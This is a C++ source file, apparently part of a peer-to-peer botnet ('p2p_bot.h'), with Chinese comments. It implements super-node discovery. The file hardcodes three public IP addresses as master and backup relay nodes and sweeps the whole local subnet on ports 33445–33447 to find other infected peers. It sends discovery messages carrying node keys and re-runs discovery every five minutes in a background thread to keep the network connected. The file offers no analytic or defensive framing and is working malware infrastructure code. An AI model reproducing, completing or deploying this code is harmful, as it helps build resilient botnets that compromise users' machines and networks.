#include "supernode_discover.h"
#include "p2p_bot.h"
#include <ws2tcpip.h>
#include <algorithm>
#include <chrono>
#include <vector>
#include <string>
#include <map>

// 默认超级节点配置
static SUPER_NODE_CONFIG g_default_super_nodes[] = {
    {"SUPERNODE_MASTER_001", "18.218.100.100", 33445,
     "A1B2C3D4E5F6A1B2C3D4E5F6A1B2C3D4E5F6A1B2C3D4E5F6", 1, 100},
     {"SUPERNODE_BACKUP_001", "52.15.200.45", 33445,
      "B2C3D4E5F6A1B2C3D4E5F6A1B2C3D4E5F6A1B2C3D4E5F6A1", 2, 80},
      {"SUPERNODE_BACKUP_002", "13.58.100.200", 33445,
       "C3D4E5F6A1B2C3D4E5F6A1B2C3D4E5F6A1B2C3D4E5F6A1B2", 3, 60},
       {"", "", 0, "", 999, 0},
       {"", "", 0, "", 999, 0},
       {"", "", 0, "", 999, 0}
};

// 全局实例
SuperNodeDiscovery g_supernode_discovery;

// 构造函数
SuperNodeDiscovery::SuperNodeDiscovery()
    : p2p_core_(nullptr), is_super_node_(0), discovery_interval_(300) {
    InitializeCriticalSection(&lock_);
    InitializeSuperNodes();
}

// 析构函数
SuperNodeDiscovery::~SuperNodeDiscovery() {
    Cleanup();
    DeleteCriticalSection(&lock_);
}

// 初始化超级节点
void SuperNodeDiscovery::InitializeSuperNodes() {
    EnterCriticalSection(&lock_);

    super_nodes_.clear();

    for (int i = 0; i < sizeof(g_default_super_nodes) / sizeof(g_default_super_nodes[0]); i++) {
        if (strlen(g_default_super_nodes[i].node_id) > 0 &&
            strlen(g_default_super_nodes[i].ip_address) > 0) {
            super_nodes_.push_back(g_default_super_nodes[i]);
        }
    }

    std::sort(super_nodes_.begin(), super_nodes_.end(),
        [](const SUPER_NODE_CONFIG& a, const SUPER_NODE_CONFIG& b) {
            return a.priority < b.priority;
        });

    LeaveCriticalSection(&lock_);
    printf("[SuperNode] Initialized %zu super nodes\n", super_nodes_.size());
}

// 初始化模块
int SuperNodeDiscovery::Initialize(P2P_CORE* core) {
    if (!core) return 0;

    p2p_core_ = core;
    printf("[SuperNode] Discovery module initialized\n");
    return 1;
}

// 清理模块
void SuperNodeDiscovery::Cleanup() {
    EnterCriticalSection(&lock_);
    partner_nodes_.clear();
    LeaveCriticalSection(&lock_);
    printf("[SuperNode] Discovery module cleaned up\n");
}

// 计算节点距离
int SuperNodeDiscovery::CalculateDistance(const char* ip1, unsigned short port1,
    const char* ip2, unsigned short port2) {
    if (strcmp(ip1, ip2) == 0) {
        return 0;
    }

    int a1, b1, c1, d1;
    int a2, b2, c2, d2;

    if (sscanf_s(ip1, "%d.%d.%d.%d", &a1, &b1, &c1, &d1) == 4 &&
        sscanf_s(ip2, "%d.%d.%d.%d", &a2, &b2, &c2, &d2) == 4) {

        int distance = 0;
        if (a1 != a2) distance += 1000;
        else if (b1 != b2) distance += 100;
        else if (c1 != c2) distance += 10;
        else distance += 1;

        return distance;
    }

    return 9999;
}

// Ping节点测试连接性
int SuperNodeDiscovery::PingNode(const char* ip, unsigned short port, int timeout_ms) {
    SOCKET test_socket = INVALID_SOCKET;
    int result = -1;

    test_socket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (test_socket != INVALID_SOCKET) {
        DWORD timeout = timeout_ms;
        setsockopt(test_socket, SOL_SOCKET, SO_RCVTIMEO, (char*)&timeout, sizeof(timeout));
        setsockopt(test_socket, SOL_SOCKET, SO_SNDTIMEO, (char*)&timeout, sizeof(timeout));

        unsigned long mode = 1;
        ioctlsocket(test_socket, FIONBIO, &mode);

        struct sockaddr_in target_addr;
        memset(&target_addr, 0, sizeof(target_addr));
        target_addr.sin_family = AF_INET;
        target_addr.sin_port = htons(port);
        inet_pton(AF_INET, ip, &target_addr.sin_addr);

        auto start_time = std::chrono::high_resolution_clock::now();

        if (connect(test_socket, (struct sockaddr*)&target_addr, sizeof(target_addr)) != SOCKET_ERROR) {
            result = 0;
        }
        else {
            int error = WSAGetLastError();
            if (error == WSAEWOULDBLOCK) {
                fd_set writefds;
                FD_ZERO(&writefds);
                FD_SET(test_socket, &writefds);

                struct timeval tv_timeout;
                tv_timeout.tv_sec = timeout_ms / 1000;
                tv_timeout.tv_usec = (timeout_ms % 1000) * 1000;

                if (select(0, NULL, &writefds, NULL, &tv_timeout) > 0) {
                    result = 0;
                }
            }
        }

        auto end_time = std::chrono::high_resolution_clock::now();
        auto duration = std::chrono::duration_cast<std::chrono::milliseconds>(end_time - start_time);

        closesocket(test_socket);

        if (result == 0) {
            return (int)duration.count();
        }
    }

    test_socket = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if (test_socket != INVALID_SOCKET) {
        DWORD timeout = timeout_ms;
        setsockopt(test_socket, SOL_SOCKET, SO_RCVTIMEO, (char*)&timeout, sizeof(timeout));
        setsockopt(test_socket, SOL_SOCKET, SO_SNDTIMEO, (char*)&timeout, sizeof(timeout));

        struct sockaddr_in target_addr;
        memset(&target_addr, 0, sizeof(target_addr));
        target_addr.sin_family = AF_INET;
        target_addr.sin_port = htons(port);
        inet_pton(AF_INET, ip, &target_addr.sin_addr);

        auto start_time = std::chrono::high_resolution_clock::now();

        const char* probe_data = "PING";
        sendto(test_socket, probe_data, strlen(probe_data), 0,
            (struct sockaddr*)&target_addr, sizeof(target_addr));

        char buffer[1024];
        struct sockaddr_in from_addr;
        int addr_len = sizeof(from_addr);

        fd_set readfds;
        struct timeval tv_timeout;
        tv_timeout.tv_sec = timeout_ms / 1000;
        tv_timeout.tv_usec = (timeout_ms % 1000) * 1000;

        FD_ZERO(&readfds);
        FD_SET(test_socket, &readfds);

        if (select(0, &readfds, NULL, NULL, &tv_timeout) > 0) {
            result = 0;
        }

        auto end_time = std::chrono::high_resolution_clock::now();
        auto duration = std::chrono::duration_cast<std::chrono::milliseconds>(end_time - start_time);

        closesocket(test_socket);

        if (result == 0) {
            return (int)duration.count();
        }
    }

    return -1;
}

// 网络分区检测函数
int SuperNodeDiscovery::DetectNetworkPartitions() {
    if (!p2p_core_) return 1;

    printf("[Partition] Checking for network partitions...\n");

    EnterCriticalSection(&lock_);

    std::map<std::string, std::vector<std::string>> connectivity_groups;

    // 按IP子网分组节点
    for (const auto& node : partner_nodes_) {
        char ip_prefix[16] = { 0 };
        strncpy_s(ip_prefix, sizeof(ip_prefix), node.ip_address, 8);
        std::string prefix_str(ip_prefix);
        connectivity_groups[prefix_str].push_back(node.node_id);
    }

    // 清空之前的分区记录
    network_partitions_.clear();
    int partition_count = (int)connectivity_groups.size();

    if (partition_count > 1) {
        printf("[Partition] Detected %d potential network partitions\n", partition_count);

        for (const auto& group : connectivity_groups) {
            std::string partition_info = "Partition: " + group.first + " (Nodes: " +
                std::to_string(group.second.size()) + ")";
            network_partitions_.push_back(partition_info);
            printf("[Partition] %s\n", partition_info.c_str());
        }
    }

    last_partition_check_time_ = (unsigned int)get_timestamp();
    LeaveCriticalSection(&lock_);

    return partition_count;
}

// 分区修复尝试
int SuperNodeDiscovery::AttemptPartitionHealing() {
    if (!p2p_core_) return 0;

    printf("[Partition] Attempting to heal network partitions...\n");

    int healing_attempts = 0;
    int successful_heals = 0;

    // 通过超级节点进行桥接
    for (const auto& super_node : super_nodes_) {
        if (PingNode(super_node.ip_address, super_node.port, 3000) >= 0) {
            printf("[Partition] Using super node %s as bridge\n", super_node.node_id);

            NETWORK_MESSAGE bridge_msg;
            memset(&bridge_msg, 0, sizeof(NETWORK_MESSAGE));
            generate_message_id(bridge_msg.message_id);
            strcpy_s(bridge_msg.sender_id, sizeof(bridge_msg.sender_id), p2p_core_->node_id);
            bridge_msg.message_type = MSG_TYPE_DISCOVERY;
            bridge_msg.timestamp = get_timestamp();
            bridge_msg.encrypted = 0;

            struct sockaddr_in target_addr;
            memset(&target_addr, 0, sizeof(target_addr));
            target_addr.sin_family = AF_INET;
            target_addr.sin_port = htons(super_node.port);
            inet_pton(AF_INET, super_node.ip_address, &target_addr.sin_addr);

            int result = sendto(p2p_core_->listen_socket, (char*)&bridge_msg,
                sizeof(NETWORK_MESSAGE), 0,
                (struct sockaddr*)&target_addr, sizeof(target_addr));

            if (result != SOCKET_ERROR) {
                healing_attempts++;
                successful_heals++;
            }
        }
    }

    printf("[Partition] Partition healing: %d/%d attempts successful\n",
        successful_heals, healing_attempts);

    return successful_heals;
}

// 启动发现过程
int SuperNodeDiscovery::StartDiscovery() {
    if (!p2p_core_) {
        printf("[SuperNode] Error: P2P core not initialized\n");
        return 0;
    }

    printf("[SuperNode] === Starting Enhanced Discovery Process ===\n");

    // 检测网络分区
    int partition_count = DetectNetworkPartitions();
    if (partition_count > 1) {
        printf("[SuperNode] Network is partitioned, attempting healing...\n");
        AttemptPartitionHealing();
    }

    // 原始发现逻辑
    unsigned int loop_count = 0;
    int contacted_count = 0;
    int successful_contacts = 0;

    NETWORK_TYPE net_type;
    char public_ip[16] = { 0 };
    network_detect_connection_type(&net_type, public_ip);
    bool is_nat_environment = (strcmp(public_ip, "NAT") == 0);

    if (is_nat_environment) {
        printf("[SuperNode] NAT environment detected, prioritizing LAN discovery\n");

        // LAN扫描逻辑
        char local_ip[16] = { 0 };
        if (get_local_ip(local_ip)) {
            char* last_dot = strrchr(local_ip, '.');
            if (last_dot) {
                char subnet_prefix[16] = { 0 };
                strncpy_s(subnet_prefix, sizeof(subnet_prefix), local_ip, last_dot - local_ip + 1);

                printf("[SuperNode] Scanning local subnet: %s*\n", subnet_prefix);

                for (int i = 1; i < 255; i++) {
                    char test_ip[16];
                    sprintf_s(test_ip, sizeof(test_ip), "%s%d", subnet_prefix, i);

                    if (strcmp(test_ip, local_ip) == 0) continue;

                    int ports[] = { 33445, 33446, 33447 };
                    for (int port_index = 0; port_index < 3; port_index++) {
                        int ping_time = PingNode(test_ip, ports[port_index], 1000);
                        if (ping_time >= 0) {
                            SUPER_NODE_CONFIG lan_node;
                            sprintf_s(lan_node.node_id, sizeof(lan_node.node_id), "LAN_NODE_%s", test_ip);
                            strcpy_s(lan_node.ip_address, sizeof(lan_node.ip_address), test_ip);
                            lan_node.port = ports[port_index];
                            strcpy_s(lan_node.public_key, sizeof(lan_node.public_key), "UNKNOWN");
                            lan_node.priority = 10;
                            lan_node.weight = 20;

                            super_nodes_.push_back(lan_node);
                            successful_contacts++;
                            break;
                        }
                    }
                }
            }
        }
    }

    // 联系预配置的超级节点
    for (const auto& super_node : super_nodes_) {
        if (strlen(super_node.node_id) == 0) continue;
        if (strcmp(super_node.node_id, p2p_core_->node_id) == 0) continue;

        contacted_count++;

        for (int retry = 1; retry <= 3; retry++) {
            int ping_time = PingNode(super_node.ip_address, super_node.port, 2000 + (retry * 1000));
            if (ping_time >= 0) {
                successful_contacts++;

                NETWORK_MESSAGE discovery_msg;
                memset(&discovery_msg, 0, sizeof(NETWORK_MESSAGE));
                generate_message_id(discovery_msg.message_id);
                strcpy_s(discovery_msg.sender_id, sizeof(discovery_msg.sender_id), p2p_core_->node_id);
                strcpy_s(discovery_msg.recipient_id, sizeof(discovery_msg.recipient_id), super_node.node_id);
                discovery_msg.message_type = MSG_TYPE_DISCOVERY;
                discovery_msg.timestamp = get_timestamp();
                discovery_msg.encrypted = 1;

                DISCOVERY_REQUEST request;
                request.request_type = DISCOVERY_TYPE_SUPER_NODE;
                strcpy_s(request.requester_public_key, sizeof(request.requester_public_key), p2p_core_->public_key);

                memcpy(discovery_msg.data, &request, sizeof(DISCOVERY_REQUEST));
                discovery_msg.data_size = sizeof(DISCOVERY_REQUEST);

                struct sockaddr_in target_addr;
                memset(&target_addr, 0, sizeof(target_addr));
                target_addr.sin_family = AF_INET;
                target_addr.sin_port = htons(super_node.port);
                inet_pton(AF_INET, super_node.ip_address, &target_addr.sin_addr);

                sendto(p2p_core_->listen_socket, (char*)&discovery_msg, sizeof(NETWORK_MESSAGE), 0,
                    (struct sockaddr*)&target_addr, sizeof(target_addr));
                break;
            }
        }
    }

    // 检查修复效果
    if (partition_count > 1) {
        int new_partition_count = DetectNetworkPartitions();
        if (new_partition_count < partition_count) {
            printf("[SuperNode] Partition healing improved connectivity: %d -> %d partitions\n",
                partition_count, new_partition_count);
        }
    }

    printf("[SuperNode] === Enhanced Discovery Completed ===\n");
    printf("[SuperNode] Contacted: %d, Successful: %d\n", contacted_count, successful_contacts);

    return successful_contacts > 0;
}

// 网络状态变化处理
void SuperNodeDiscovery::OnNetworkStatusChange(NETWORK_TYPE new_type, const char* public_ip) {
    printf("[SuperNode] Network status changed to: %d, public IP: %s\n", new_type, public_ip);

    if (new_type == NET_TYPE_WAN_ONLY || new_type == NET_TYPE_BOTH) {
        printf("[SuperNode] Starting super node discovery process...\n");
        StartDiscovery();
    }
}

// 处理伙伴发现消息
int SuperNodeDiscovery::HandlePartnerDiscoveryMessage(const NETWORK_MESSAGE* msg) {
    if (!msg || !p2p_core_) return 0;

    printf("[SuperNode] Handling discovery message from: %s\n", msg->sender_id);

    if (msg->message_type == MSG_TYPE_DISCOVERY && msg->data_size >= sizeof(DISCOVERY_REQUEST)) {
        DISCOVERY_REQUEST* request = (DISCOVERY_REQUEST*)msg->data;

        if (request->request_type == DISCOVERY_TYPE_SUPER_NODE) {
            printf("[SuperNode] Received super node connection request\n");

            char sender_ip[16] = { 0 };
            int found = 0;

            EnterCriticalSection(&g_nodes_cs);
            for (unsigned int i = 0; i < g_node_count; i++) {
                if (strcmp(g_known_nodes[i].node_id, msg->sender_id) == 0) {
                    strcpy_s(sender_ip, sizeof(sender_ip), g_known_nodes[i].ip_address);
                    found = 1;
                    break;
                }
            }
            LeaveCriticalSection(&g_nodes_cs);

            if (found) {
                AddSuperNode(msg->sender_id, sender_ip, DEFAULT_PORT,
                    request->requester_public_key, 5, 50);
                return 1;
            }
        }
    }

    return 0;
}

// 获取伙伴节点列表
std::vector<PARTNER_NODE> SuperNodeDiscovery::GetPartnerNodes(int max_count) {
    EnterCriticalSection(&lock_);

    std::vector<PARTNER_NODE> result;
    int count = (std::min)(max_count, (int)partner_nodes_.size());

    for (int i = 0; i < count; i++) {
        result.push_back(partner_nodes_[i]);
    }

    LeaveCriticalSection(&lock_);
    return result;
}

// 添加超级节点
int SuperNodeDiscovery::AddSuperNode(const char* node_id, const char* ip, unsigned short port,
    const char* pub_key, int priority, int weight) {
    if (!node_id || !ip || strlen(node_id) == 0 || strlen(ip) == 0) {
        return 0;
    }

    SUPER_NODE_CONFIG new_node;
    memset(&new_node, 0, sizeof(new_node));
    strcpy_s(new_node.node_id, sizeof(new_node.node_id), node_id);
    strcpy_s(new_node.ip_address, sizeof(new_node.ip_address), ip);
    new_node.port = port;
    if (pub_key) {
        strcpy_s(new_node.public_key, sizeof(new_node.public_key), pub_key);
    }
    new_node.priority = priority;
    new_node.weight = weight;

    EnterCriticalSection(&lock_);
    super_nodes_.push_back(new_node);

    std::sort(super_nodes_.begin(), super_nodes_.end(),
        [](const SUPER_NODE_CONFIG& a, const SUPER_NODE_CONFIG& b) {
            return a.priority < b.priority;
        });

    LeaveCriticalSection(&lock_);
    printf("[SuperNode] Added new super node: %s (%s:%d)\n", node_id, ip, port);
    return 1;
}

// 检查是否应该作为超级节点运行
int SuperNodeDiscovery::ShouldActAsSuperNode() {
    MEMORYSTATUSEX memory_status;
    memory_status.dwLength = sizeof(memory_status);

    if (GlobalMemoryStatusEx(&memory_status)) {
        // 内存大于4GB时考虑作为超级节点
        if (memory_status.ullTotalPhys > 4ULL * 1024 * 1024 * 1024) {
            return 1;
        }
    }

    return 0;
}

// 停止发现过程
void SuperNodeDiscovery::StopDiscovery() {
    printf("[SuperNode] Stopping discovery process...\n");
    // 停止相关线程和清理逻辑
}

// 全局函数实现
int supernode_discovery_init(P2P_CORE* core) {
    return g_supernode_discovery.Initialize(core);
}

void supernode_discovery_cleanup() {
    g_supernode_discovery.Cleanup();
}

void supernode_discovery_on_network_change(NETWORK_TYPE net_type, const char* public_ip) {
    g_supernode_discovery.OnNetworkStatusChange(net_type, public_ip);
}

int supernode_discovery_handle_message(const NETWORK_MESSAGE* msg) {
    return g_supernode_discovery.HandlePartnerDiscoveryMessage(msg);
}

// 发现线程函数
unsigned __stdcall supernode_discovery_thread(void* param) {
    P2P_CORE* core = (P2P_CORE*)param;

    if (!core) {
        printf("[SuperNode] Error: Invalid core pointer for discovery thread\n");
        return 0;
    }

    printf("[SuperNode] Discovery thread started\n");

    while (core->running) {
        // 每5分钟执行一次发现
        Sleep(300000);

        NETWORK_TYPE net_type;
        char public_ip[16] = { 0 };

        if (network_detect_connection_type(&net_type, public_ip)) {
            if (net_type == NET_TYPE_WAN_ONLY || net_type == NET_TYPE_BOTH) {
                printf("[SuperNode] Starting periodic discovery...\n");
                g_supernode_discovery.StartDiscovery();
            }
        }
    }

    printf("[SuperNode] Discovery thread exited\n");
    return 1;
}

// 启动发现线程
int supernode_discovery_start_thread(P2P_CORE* core) {
    if (!core) return 0;

    HANDLE discovery_thread = (HANDLE)_beginthreadex(NULL, 0, supernode_discovery_thread, core, 0, NULL);
    if (!discovery_thread) {
        printf("[SuperNode] Failed to create discovery thread\n");
        return 0;
    }

    CloseHandle(discovery_thread);
    printf("[SuperNode] Discovery thread started successfully\n");
    return 1;
}

// 修复函数名不一致问题 - 添加别名函数
int supernode_discovery_start(P2P_CORE* core) {
    return supernode_discovery_start_thread(core);
}